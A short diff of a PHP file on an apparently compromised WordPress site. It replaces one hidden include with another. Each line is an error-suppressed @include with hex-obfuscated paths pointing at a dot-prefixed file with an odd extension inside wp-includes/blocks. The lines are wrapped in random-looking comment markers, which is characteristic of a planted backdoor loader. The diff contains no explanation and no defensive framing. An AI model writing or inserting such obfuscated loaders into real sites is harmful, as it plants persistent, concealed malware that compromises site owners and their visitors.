@@ -1,9 +1,11 @@
 <?php
 /*3195d*/
 
-@include ("/home/sharifenterprise/pub\x6cic_htm\x6c/wp-inc\x6cudes/b\x6cocks/shortcode/.b5948fe4.otc");
+@include ("/home/sharifenterprise/p\x75blic_html/wp\x2dincl\x75des/blocks/col\x75mns/.71463096.oti");
 
-/*3195d*/ 
+/*3195d*/
+
+ 
 
 
 
